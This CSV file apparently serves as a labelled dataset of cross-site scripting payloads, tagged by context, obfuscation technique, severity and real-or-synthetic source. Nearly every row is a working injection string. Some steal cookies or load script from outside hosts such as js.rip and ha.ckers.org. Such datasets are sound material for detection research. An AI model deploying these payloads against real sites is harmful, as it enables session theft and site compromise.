payload,context,technique,severity,length,source
<button popovertarget=x>Click me</button><nobr ontoggle=alert(1) popover id=x>AnonKryptiQuz</nobr>,event_handler,none,medium,98,real
"<input3 draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",event_handler,none,medium,90,real
"<details oncontextmenu=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,57,real
"<hgroup id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></hgroup>",event_handler,none,medium,88,real
.alert(1);,generic,none,medium,10,real
"<body onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</body>",event_handler,none,medium,63,real
"&lt;A HREF=\""http&#58;//1113982867/\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,54,real
<frame onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
"<q onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</q>",event_handler,none,medium,77,real
"<rb onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,64,real
"<col onclick=""alert(1)"" style=display:block>AnonKryptiQuz</col>",event_handler,none,medium,63,real
<p v-show=_createBlock.constructor`alert(1)`()>,template_injection,template,medium,47,real
"<style>:target {color: red;}</style><progress id=x style=""transition:color 10s"" ontransitioncancel=print()></progress>",event_handler,none,low,118,real
<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>,event_handler,none,medium,63,real
"<spacer onmouseout=""alert(1)"">AnonKryptiQuz</spacer>",event_handler,none,medium,52,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",event_handler,none,medium,178,real
<svG oNerRor=coNsoLe.Log('XSS')/>,tag_injection,synthetic,medium,33,synthetic
<svg onmous&#101;ov&#101;r=prompt('XSS')>,tag_injection,synthetic,medium,41,synthetic
<command onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</command><input value=clickme>,event_handler,none,medium,114,real
"<noframes onmouseenter=""alert(1)"">AnonKryptiQuz</noframes>",event_handler,none,medium,58,real
"<video draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,88,real
<main onpointerdown=alert(1) style=display:block>AnonKryptiQuz</main>,event_handler,none,medium,69,real
<script>//confirm(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,medium,52,synthetic
"<dialog oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<ins onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",event_handler,none,medium,68,real
""" onfocus=console.log(location.hash) autofocus=""",attribute_escape,synthetic,medium,48,synthetic
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,event_handler,none,medium,60,real
<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,event_handler,none,medium,77,real
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out,generic,none,medium,95,real
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",js_uri,case_variation,medium,66,real
' oNmoUseEntEr=ProMpt(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,40,synthetic
<body onscroll=javascript:alert(8034)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,event_handler,none,medium,215,real
"<nav onmouseover=""alert(1)"">AnonKryptiQuz</nav>",event_handler,none,medium,47,real
<datalist onpointerover=alert(1) style=display:block>AnonKryptiQuz</datalist>,event_handler,none,medium,77,real
<center onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</center>,event_handler,none,medium,78,real
"<meta draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,86,real
<meter contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,59,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></colgroup>",event_handler,none,low,185,real
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,event_handler,none,medium,44,real
"""oncut=alert(1)",event_handler,none,medium,15,real
<button popovertarget=x>Click me</button><image3 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</image3>,event_handler,none,medium,108,real
<svg onload=\u0061lert('XSS')>,tag_injection,synthetic,medium,30,synthetic
<svg onlo&#97;d=prompt(1)/>,tag_injection,synthetic,medium,27,synthetic
"<tbody onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",event_handler,none,medium,71,real
"document.body.innerHTML=""&ltimg src=x onerror=alert&lpar;23&rpar;&gt""",event_handler,none,low,69,real
<button popovertarget=x>Click me</button><details ontoggle=alert(1) popover id=x>AnonKryptiQuz</details>,event_handler,none,medium,104,real
<svG oNtoGglE=pRomPt(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,37,synthetic
"<marquee onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</marquee>",event_handler,none,medium,87,real
"<del onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,81,real
<img src=x onerror=alert(“falcon”)>,event_handler,none,medium,35,real
"<font onmouseout=""alert(1)"">AnonKryptiQuz</font>",event_handler,none,medium,48,real
"<div draggable=""true"" contenteditable>drag me</div><u ondragover=alert(1) contenteditable style=display:block>drop here</u>",event_handler,none,medium,123,real
"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,58,real
<section onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</section>,event_handler,none,medium,80,real
"<menuitem onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",event_handler,none,medium,74,real
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",event_handler,none,medium,115,real
"<font draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</font>",event_handler,none,medium,81,real
<animatemotion onpointerenter=alert(1) style=display:block>AnonKryptiQuz</animatemotion>,event_handler,none,medium,88,real
"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('AnonKryptiQuz');\""&gt;&lt;/FRAMESET&gt;",generic,html_entity,medium,94,real
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,script_injection,none,medium,196,real
%27 onclick=confirm(1) %27,attribute_escape,synthetic,medium,26,synthetic
</script><svg><script>alert(1)-%26apos%3B,script_injection,url_encoding,medium,41,real
%3Cimg onload=prompt('XSS')%3E,tag_injection,synthetic,medium,30,synthetic
""" oNfoCus=alErt('XSS') """,attribute_escape,synthetic,medium,24,synthetic
<dd id=x tabindex=1 onactivate=alert(1)></dd>,event_handler,none,medium,45,real
'></select><script>alert(123)</script>,script_injection,none,medium,38,real
"""><script src=""https://js.rip/<custom.name>""></script>",script_injection,none,low,54,real
"<svg ontoggl&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,67,synthetic
"eval(""prompt(1)"")",dom_sink,synthetic,medium,17,synthetic
""" oNmoUseEntEr=ProMpt(loCatIon.haSh) """,attribute_escape,synthetic,medium,38,synthetic
<img src=x onError=import('//1152848220/')>,event_handler,none,low,43,real
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",event_handler,none,medium,126,real
#javascript:(alert('AnonKryptiQuz Success!'))(),js_uri,none,medium,47,real
%3Csvg onmouseover=prompt(document.cookie)%3E,tag_injection,synthetic,medium,45,synthetic
"<input type=""image"" src=""invalid"" onerror=""alert('AnonKryptiQuz')"">",event_handler,none,medium,67,real
<noembed onpointerdown=alert(1) style=display:block>AnonKryptiQuz</noembed>,event_handler,none,medium,75,real
"document.write(""<img src=x onerror=alert('XSS')>"")",dom_sink,synthetic,medium,50,synthetic
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,56,real
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",event_handler,none,medium,107,real
javascript%3Avar%7Ba%3Aonerror%7D%3D%7Ba%3Aalert%7D%3Bthrow%2520document.cookie,dom_sink,url_encoding,high,79,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",event_handler,none,medium,180,real
+330011223344;phone-context=<script>alert(0)</script>,script_injection,none,medium,53,real
<scRipT>pRomPt`'XSS'`</sCriPt>,script_injection,synthetic,medium,30,synthetic
<script>&#97;l&#101;rt`loc&#97;tion.h&#97;sh`</script>,script_injection,synthetic,medium,54,synthetic
<abbr onpointerleave=alert(1) style=display:block>AnonKryptiQuz</abbr>,event_handler,none,medium,70,real
<abbr contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
<img onlo&#97;d=prompt(1)>,tag_injection,synthetic,medium,26,synthetic
"<article onmousedown=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,55,real
"<blockquote onmouseleave=""alert(1)"">AnonKryptiQuz</blockquote>",event_handler,none,medium,62,real
"<dir onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,79,real
"<tr draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",event_handler,none,medium,77,real
<svG oNmoUseEntEr=ProMpt('XSS')/>,tag_injection,synthetic,medium,33,synthetic
<svg><tt onload=alert(1)></tt>,event_handler,none,medium,30,real
"<tr oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
j&#97;v&#97;script:void(prompt('XSS')),js_uri,synthetic,medium,38,synthetic
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;,generic,none,medium,72,real
"<address onmouseout=""alert(1)"">AnonKryptiQuz</address>",event_handler,none,medium,54,real
<iframe onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<code onmouseup=""alert(1)"">AnonKryptiQuz</code>",event_handler,none,medium,47,real
"<style>:target {color:red;}</style><textarea id=x style=""transition:color 1s"" ontransitionend=alert(1)></textarea>",event_handler,none,medium,114,real
"<option ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</option>",event_handler,none,medium,93,real
"""><svg onmouseover=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",dom_sink,html_entity|whitespace_obfuscation,low,86,real
' onmous&#101;&#101;nt&#101;r=prompt('XSS') ',attribute_escape,synthetic,medium,45,synthetic
<menu onpointerenter=alert(1) style=display:block>AnonKryptiQuz</menu>,event_handler,none,medium,70,real
<hgroup id=x tabindex=1 onbeforedeactivate=alert(1)></hgroup><input autofocus>,event_handler,none,medium,78,real
<script onerror=alert(1) src=/></script>,script_injection,none,medium,40,real
"""><svg on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,51,synthetic
%253cscript%253ealert(document.cookie)%253c/script%253e,dom_sink,url_encoding,high,55,real
"""><svg onb&#101;gin=consol&#101;.log(1)>",tag_injection,synthetic,medium,40,synthetic
"JavAscRipT:pRomPt(StrIng.frOmCHarCodE(88,83,83))",js_uri,synthetic,medium,48,synthetic
"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></td>",event_handler,none,medium,122,real
<svg onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,62,synthetic
"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search",script_injection,encoding|case_variation,medium,276,real
"<frameset onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",event_handler,none,medium,71,real
<scr<object>ipt>alert(1)</script>,tag_injection,none,medium,33,real
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,event_handler,none,medium,49,real
"EvaL(""ProMpt('XSS')"")",dom_sink,synthetic,medium,21,synthetic
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>,event_handler,none,medium,72,real
"<style>@keyframes slidein {}</style><rb style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rb>",event_handler,none,medium,158,real
%3Csvg onload=alert(document.domain)/%3E,tag_injection,synthetic,medium,40,synthetic
"<dialog onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",event_handler,none,medium,71,real
<input4 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></keygen>",event_handler,none,medium,166,real
<image/src/onerror=prompt(8)>,event_handler,none,medium,29,real
"<shadow onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</shadow>",event_handler,none,medium,87,real
<span id=x tabindex=1 onfocus=alert(1)></span>,event_handler,none,medium,46,real
"%3Csvg ontoggle=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,56,synthetic
Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337),generic,none,medium,81,real
"<svg on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,76,synthetic
"<details onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</details>",event_handler,none,medium,76,real
%27 onmouseenter=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,43,synthetic
"<bdo onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</bdo>",event_handler,none,medium,65,real
<svG oNloAd=ConFirM(dOcuMenT.dOmaIn)/>,tag_injection,synthetic,medium,38,synthetic
"<html onmousedown=""alert(1)"">AnonKryptiQuz</html>",event_handler,none,medium,49,real
"<noembed ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,95,real
""" ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,58,synthetic
"""><img onlo&#97;d=&#97;l&#101;rt('XSS')>",tag_injection,synthetic,medium,40,synthetic
%3Csvg ontoggle=console.log(1)%3E,tag_injection,synthetic,medium,33,synthetic
"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" ontransitionend=alert(1)></rt>",event_handler,none,medium,102,real
<svg onmouseenter=prompt(document.domain)>,tag_injection,synthetic,medium,42,synthetic
"<b onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</b>",event_handler,none,medium,75,real
"""'><img src=xxx:x onerror\x09=javascript:alert(1)>",js_uri,none,medium,50,real
"<div oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</div>",event_handler,none,medium,58,real
"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\""&gt;",event_handler,none,medium,99,real
"""><svg ontoggl&#101;=confirm(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,56,synthetic
%22 onmouseenter=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,37,synthetic
""" ontoggl&#101;=consol&#101;.log(1) """,attribute_escape,synthetic,medium,37,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></link>",event_handler,none,medium,178,real
"<style>:target {color: red;}</style><col id=x style=""transition:color 10s"" ontransitioncancel=print()></col>",event_handler,none,low,108,real
"<template oncontextmenu=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,59,real
"<bdo onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",event_handler,none,medium,65,real
<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>,event_handler,none,medium,62,real
#\'-alert(1)//,generic,none,medium,14,real
"<center onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</center>",event_handler,none,medium,69,real
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",tag_injection,comment_injection|case_variation,medium,49,real
e71%3balert(1)//503466e3,generic,url_encoding,medium,24,real
"<style>:target {transform: rotate(180deg);}</style><video id=x style=""transition:transform 2s"" ontransitionrun=print()></video>",event_handler,none,low,127,real
%22 onfocus=console.log(document.domain) autofocus=%22,attribute_escape,synthetic,medium,54,synthetic
<scRipT>//alErt(doCumEnt.coOkiE)</scRipT>,script_injection,synthetic,medium,41,synthetic
"<a/href=""javascript%0A%0D:alert()"">",attribute_escape,url_encoding,medium,35,real
"<img src=x onerror=alert(String.fromCharCode(88,83,83));>",event_handler,encoding,medium,57,real
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></meter>",event_handler,none,medium,103,real
"<image3 onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",event_handler,none,medium,72,real
"<u onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,64,real
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(1)"">XSS</a>",generic,protocol,medium,83,real
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,event_handler,none,medium,60,real
<svg onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,58,synthetic
<menu onpointerup=alert(1) style=display:block>AnonKryptiQuz</menu>,event_handler,none,medium,67,real
<link href=validstyles.css rel=stylesheet onload=alert(1)>,event_handler,none,medium,58,real
"<applet code=""javascript:confirm(document.cookie);"">",js_uri,none,high,52,real
"<script draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,90,real
"<style>:target {color: red;}</style><form id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></form>",event_handler,none,medium,111,real
"<style>:target {transform: rotate(180deg);}</style><html id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></html>",event_handler,none,medium,126,real
"<ol onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",event_handler,none,medium,59,real
<img/src/onerror=alert/1337/(1)>,event_handler,none,low,32,real
<mark onpointerleave=alert(1) style=display:block>AnonKryptiQuz</mark>,event_handler,none,medium,70,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></content>",event_handler,none,medium,184,real
"</script><svg onload='-/""/-confirm(1)//'""",event_handler,none,medium,41,real
"<track onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</track>",event_handler,none,medium,72,real
<svG oNbeGin=alErt(doCumEnt.coOkiE)>,tag_injection,synthetic,medium,36,synthetic
<IMG SRC=”javascript:alert(‘AnonKryptiQuz’)”,js_uri,case_variation,medium,44,real
' onerror=confirm('XSS') ',attribute_escape,synthetic,medium,26,synthetic
"<q onmousemove=""alert(1)"">AnonKryptiQuz</q>",event_handler,none,medium,43,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rt>",event_handler,none,medium,174,real
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,86,synthetic
<button popovertarget=x>Click me</button><menu ontoggle=alert(1) popover id=x>AnonKryptiQuz</menu>,event_handler,none,medium,98,real
"<style>:target {color:red;}</style><meter id=x style=""transition:color 1s"" ontransitionstart=alert(1)></meter>",event_handler,none,medium,110,real
"<param onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,85,real
"<wbr draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</wbr>",event_handler,none,medium,64,real
<br onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,64,real
"<center draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,90,real
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationstart=""alert(1)""></ul>",event_handler,none,medium,91,real
<button popovertarget=x>Click me</button><menuitem ontoggle=alert(1) popover id=x>AnonKryptiQuz</menuitem>,event_handler,none,medium,106,real
"""><Svg onBegIn=AleRt(1)>",tag_injection,synthetic,medium,24,synthetic
<summary onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</summary><input value=clickme>,event_handler,none,medium,114,real
"<var oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</var>",event_handler,none,medium,58,real
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></picture>",event_handler,none,medium,107,real
"' onmouseover=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,54,synthetic
<element onpointerleave=alert(1) style=display:block>AnonKryptiQuz</element>,event_handler,none,medium,76,real
<IMG SRC='vbscript:msgbox(1134)'>,tag_injection,case_variation,low,33,real
"<image2 onclick=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",event_handler,none,medium,69,real
"</b style=""expr/**/ession(alert('vulnerable'))"">",attribute_escape,comment_injection,medium,48,real
"<source ondblclick=""alert(1)"">AnonKryptiQuz</source>",event_handler,none,medium,52,real
<svg onerror=\u0061lert(1)>,tag_injection,synthetic,medium,27,synthetic
"<head oncut=""alert(1)"" contenteditable>AnonKryptiQuz</head>",event_handler,none,medium,59,real
"<isindex onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</isindex>",event_handler,none,medium,72,real
"<strong onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,74,real
"<shadow oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<u draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</u>",event_handler,none,medium,55,real
"<option draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</option>",event_handler,none,medium,70,real
<svg onmouseenter=confirm(location.hash)/>,tag_injection,synthetic,medium,42,synthetic
"<xml src=""javascript:document.vulnerable=true;"">",js_uri,none,low,48,real
<input onpointermove=alert(1) style=display:block>AnonKryptiQuz</input>,event_handler,none,medium,71,real
"<article onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</article>",event_handler,none,medium,67,real
<article onpointerleave=alert(1) style=display:block>AnonKryptiQuz</article>,event_handler,none,medium,76,real
<script>//confirm(document.domain)</script>,script_injection,synthetic,medium,43,synthetic
"<a href=""  &#x8; &#23;   javascript:alert('Successful AnonKryptiQuz')"">Click this link!</a>",js_uri,html_entity,medium,91,real
'href=javascript:alert()>click me<a/y=',js_uri,none,medium,39,real
<button popovertarget=x>Click me</button><header onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</header>,event_handler,none,medium,108,real
</script><script>confirm(document.cookie)</script>,script_injection,none,high,50,real
""" onload=alert('XSS') """,attribute_escape,synthetic,medium,23,synthetic
<svg ontoggl&#101;=confirm('XSS')/>,tag_injection,synthetic,medium,35,synthetic
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",event_handler,none,medium,93,real
"<style>@keyframes x{}</style><del style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></del>",event_handler,none,medium,99,real
"<strike onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",event_handler,none,medium,73,real
%22})))}catch(e){alert(document.domain);}//,dom_sink,url_encoding,medium,43,real
<animatemotion contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,67,real
"<u draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</u>",event_handler,none,medium,60,real
"<iframe onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</iframe>",event_handler,none,medium,69,real
'>'><SCript>alert(2);</script>,script_injection,case_variation,medium,30,real
<button popovertarget=x>Click me</button><sub ontoggle=alert(1) popover id=x>AnonKryptiQuz</sub>,event_handler,none,medium,96,real
javascr	ipt:void(prompt('XSS')),js_uri,synthetic,medium,31,synthetic
"""`'><script>\x0Djavascript:alert(7364)</script>",script_injection,none,medium,47,real
"<bdi onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",event_handler,none,medium,67,real
"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",event_handler,none,medium,75,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dt>",event_handler,none,medium,174,real
<meter onpointerout=alert(1) style=display:block>AnonKryptiQuz</meter>,event_handler,none,medium,70,real
"<datalist onmouseup=""alert(1)"">AnonKryptiQuz</datalist>",event_handler,none,medium,55,real
"<style>:target {color:red;}</style><u id=x style=""transition:color 1s"" ontransitionend=alert(1)></u>",event_handler,none,medium,100,real
"<del draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,84,real
""" onclick=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,41,synthetic
"<article onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</article>",event_handler,none,medium,70,real
"<ins onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</ins>",event_handler,none,medium,79,real
<svg><spacer onload=alert(1)></spacer>,event_handler,none,medium,38,real
"<noembed draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,90,real
"<image onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</image>",event_handler,none,medium,69,real
%3Csvg onbegin=alert(1)%3E,tag_injection,synthetic,medium,26,synthetic
"document.write(""<img src=x onerror=console.log(document.domain)>"")",dom_sink,synthetic,medium,66,synthetic
"<dialog ondblclick=""alert(1)"">AnonKryptiQuz</dialog>",event_handler,none,medium,52,real
<script onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</script>,script_injection,none,medium,78,real
<h1 onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
<html onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</html><input value=clickme>,event_handler,none,medium,108,real
"<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=""alert\x281\x29"">';target.onload=setTimeout(function(){frames[0].postMessage("""", ""*"")},100)</script>",dom_sink,restricted_chars,high,271,real
<iframe id=x onfocusin=alert(1)>,event_handler,none,medium,32,real
""" oNfoCus=coNsoLe.Log('XSS') """,attribute_escape,synthetic,medium,30,synthetic
